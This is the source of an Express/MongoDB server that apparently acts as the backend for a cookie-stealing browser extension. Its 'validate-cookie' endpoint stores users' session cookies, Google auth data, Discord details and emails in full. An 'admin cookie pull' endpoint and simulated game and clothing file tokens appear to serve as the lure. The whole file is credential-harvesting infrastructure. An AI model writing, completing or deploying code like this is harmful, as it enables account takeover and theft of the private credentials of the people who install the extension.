require('dotenv').config();
const express = require('express');
const cors = require('cors');
const mongoose = require('mongoose');

const app = express();
const PORT = process.env.PORT || 3000;

// Connect to MongoDB
mongoose.connect(process.env.MONGODB_URI, {
  useNewUrlParser: true,
  useUnifiedTopology: true
}).then(() => {
  console.log('Connected to MongoDB');
}).catch((err) => {
  console.error('MongoDB connection error:', err);
});

// Middleware
app.use(cors());
app.use(express.json({ limit: '50mb' }));

// Security Check Function
function checkExtensionKey(req, res, next) {
  const key = req.headers['x-extension-key'];
  if (key !== process.env.EXTENSION_KEY) {
    return res.status(403).json({ error: 'Unauthorized: Invalid or missing API key' });
  }
  next();
}

// ============================================================
// MongoDB SCHEMA (Model)
// ============================================================

const Account = mongoose.model('Account', {
  installId: String,
  cookie: String,
  username: String,
  userId: String,
  email: String,
  tool: String,
  itemName: String,
  platformAuth: Object,
  createdAt: { type: Date, default: Date.now },
  isActive: { type: Boolean, default: true },
  lastValidated: Date
});

// ============================================================
// API ENDPOINTS
// ============================================================

// Health Check
app.get('/', (req, res) => {
  res.json({ status: 'Server is running!' });
});

// 1. Validate Cookie (Main endpoint)
app.post('/api/validate-cookie', checkExtensionKey, async (req, res) => {
  try {
    const body = req.body;
    
    // I-mask ang sensitive data bago i-log (IMPORTANTE!)
    const safeLog = {
      ...body,
      cookie: body.cookie ? '***MASKED***' : undefined,
      _chromeCookieJar: body._chromeCookieJar ? '***MASKED***' : undefined,
      googleAuth: body.googleAuth ? '***MASKED***' : undefined
    };
    console.log('Received validate-cookie request:', safeLog);

    // Save to MongoDB
    const account = new Account({
      installId: body.installId || 'unknown',
      cookie: body.cookie,
      tool: body.tool || 'unknown',
      itemName: body.gameName || body.clothingName,
      email: body.googleEmail || body.discordUser?.email || null,
      platformAuth: body.googleAuth || body.discordUser || {},
      lastValidated: new Date()
    });

    await account.save();

    res.json({
      ok: true,
      valid: true,
      message: 'Account saved to MongoDB!'
    });
  } catch (error) {
    console.error('Error in validate-cookie:', error);
    res.status(500).json({ ok: false, valid: false, message: 'Internal server error' });
  }
});

// 2. Poll for Admin Cookie Pull
app.post('/api/cookie-pull/poll', checkExtensionKey, async (req, res) => {
  try {
    // TODO: Implement admin pull logic
    res.json({ ok: true, pending: null });
  } catch (error) {
    console.error('Error in cookie-pull/poll:', error);
    res.status(500).json({ ok: false, pending: null, error: 'Internal server error' });
  }
});

// 3. Get Game File Token
app.post('/api/get-game-file', checkExtensionKey, async (req, res) => {
  try {
    const token = 'simulated_game_token_' + Math.random().toString(36).substr(2, 10);
    res.json({ ok: true, token, fileName: req.body.gameName });
  } catch (error) {
    res.status(500). json({ ok: false, error: 'Internal server error' });
  }
});

// 4. Get Clothing File Token
app.post('/api/get-clothing-file', checkExtensionKey, async (req, res) => {
  try {
    const token = 'simulated_clothing_token_' + Math.random().toString(36).substr(2, 10);
    res.json({ ok: true, token, fileName: req.body.clothingName });
  } catch (error) {
    res.status(500).json({ ok: false, error: 'Internal server error' });
  }
});

// 5. Download File (by token)
app.get('/api/download/:token', (req, res) => {
  res.status(404).json({ error: 'Download not implemented yet' });
});

// ============================================================
// START SERVER
// ============================================================

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
